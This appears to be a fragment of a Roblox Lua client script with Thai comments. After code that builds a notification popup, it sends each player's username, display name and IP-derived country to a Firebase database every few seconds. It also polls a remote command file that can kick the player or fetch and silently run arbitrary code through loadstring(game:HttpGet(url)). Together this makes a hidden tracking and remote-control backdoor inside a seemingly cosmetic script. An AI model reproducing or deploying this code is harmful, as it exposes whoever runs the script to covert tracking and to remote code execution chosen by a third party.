    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(0, 255, 157) -- ปรับเป็นสีเขียว Neon ตามธีม
    stroke.Transparency = 1
 
    local titleLbl = Instance.new("TextLabel", frame)
    titleLbl.Text = " ✨ " .. title:upper()
    titleLbl.Size = UDim2.new(1, -30, 0, 30)
    titleLbl.Position = UDim2.new(0, 15, 0, 10)
    titleLbl.TextColor3 = Color3.fromRGB(0, 255, 157)
    titleLbl.Font = Enum.Font.GothamBold
    titleLbl.TextSize = 13
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.BackgroundTransparency = 1
    titleLbl.TextTransparency = 1
 
    local contentLbl = Instance.new("TextLabel", frame)
    contentLbl.Text = text
    contentLbl.Size = UDim2.new(1, -30, 0, 40)
    contentLbl.Position = UDim2.new(0, 15, 0, 35)
    contentLbl.TextColor3 = Color3.fromRGB(220, 220, 220)
    contentLbl.Font = Enum.Font.Gotham
    contentLbl.TextSize = 12
    contentLbl.TextWrapped = true
    contentLbl.TextXAlignment = Enum.TextXAlignment.Left
    contentLbl.TextYAlignment = Enum.TextYAlignment.Top
    contentLbl.BackgroundTransparency = 1
    contentLbl.TextTransparency = 1
 
    local barBG = Instance.new("Frame", frame)
    barBG.Size = UDim2.new(1, -30, 0, 2)
    barBG.Position = UDim2.new(0, 15, 1, -10)
    barBG.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    barBG.BorderSizePixel = 0
    barBG.BackgroundTransparency = 1
 
    local bar = Instance.new("Frame", barBG)
    bar.Size = UDim2.new(1, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(0, 255, 157)
    bar.BorderSizePixel = 0
 
    -- [[ ANIMATION IN ]] --
    local infoIn = TweenInfo.new(0.7, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out)
    TweenService:Create(frame, infoIn, {Size = UDim2.new(1, 0, 0, 85), BackgroundTransparency = 0.1}):Play()
    TweenService:Create(stroke, infoIn, {Transparency = 0.8}):Play()
    TweenService:Create(titleLbl, infoIn, {TextTransparency = 0}):Play()
    TweenService:Create(contentLbl, infoIn, {TextTransparency = 0}):Play()
    TweenService:Create(barBG, infoIn, {BackgroundTransparency = 0}):Play()
 
    -- ฟังก์ชันปิด
    local function close()
        local infoOut = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In)
        TweenService:Create(frame, infoOut, {Size = UDim2.new(1, 0, 0, 0), BackgroundTransparency = 1}):Play()
        task.delay(0.5, function() frame:Destroy() end)
    end
 
    frame.MouseButton1Click:Connect(close)
    local barTween = TweenService:Create(bar, TweenInfo.new(8, Enum.EasingStyle.Linear), {Size = UDim2.new(0, 0, 1, 0)})
    barTween:Play()
    barTween.Completed:Connect(close)
end
 
-- ================================================= --
--      [ PART 2: GEO & SYSTEM LOGIC (V13 CORE) ]    --
-- ================================================= --
 
-- ฟังก์ชันดึง Geo IP
local function getGeo()
    local ok, res = pcall(function() return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/")) end)
    return (ok and res.status == "success") and res or {country = "Unknown", countryCode = "UN"}
end
local geo = getGeo()
 
-- Heartbeat: ส่งข้อมูลขึ้น Firebase
task.spawn(function()
    while true do
        pcall(function()
            HttpService:RequestAsync({
                Url = DB_URL .. "users/" .. localPlayer.Name .. ".json",
                Method = "PUT",
                Body = HttpService:JSONEncode({
                    lastActive = os.time(),
                    display = localPlayer.DisplayName,
                    cName = geo.country,
                    cCode = geo.countryCode
                })
            })
        end)
        task.wait(3.5)
    end
end)
 
-- ================================================= --
--      [ PART 3: COMMAND LISTENER (ANTI-LOOP) ]     --
-- ================================================= --
 
local lastTime = 0
-- เช็คเวลาเริ่มต้นเพื่อกัน Loop Kick
local ok, initCmd = pcall(function() return game:HttpGet(DB_URL .. "command.json") end)
if ok and initCmd ~= "null" then
    local data = HttpService:JSONDecode(initCmd)
    if data and data.time then lastTime = data.time end
end
 
--createNotify("System", "Global Network Connected ✧")
 
task.spawn(function()
    while true do
        local ok, res = pcall(function() return game:HttpGet(DB_URL .. "command.json") end)
        if ok and res ~= "null" then
            local data = HttpService:JSONDecode(res)
 
            -- ใช้ data.time (ตัวพิมพ์เล็ก) ตาม Web V13
            if data.time and data.time > lastTime then
                lastTime = data.time
                local target = tostring(data.target)
 
                if target == localPlayer.Name or target == "ALL" then
 
                    if data.action == "Alert" then
                        createNotify("NOTIFICATIONS", data.msg or "No Message")
 
                    elseif data.action == "Kick" and target ~= "ALL" then
                        localPlayer:Kick(data.msg)
 
                    elseif data.action == "Execute" and data.url then
                        local s_ok, err = pcall(function() loadstring(game:HttpGet(data.url))() end)
                        if s_ok then
                          --  createNotify("SCRIPT", "Remote Script Executed")
                        else
                            --createNotify("ERROR", "Script Failed to Run")
                        end
                    end
                end
            end
        end
        task.wait(1)
    end
end)
 
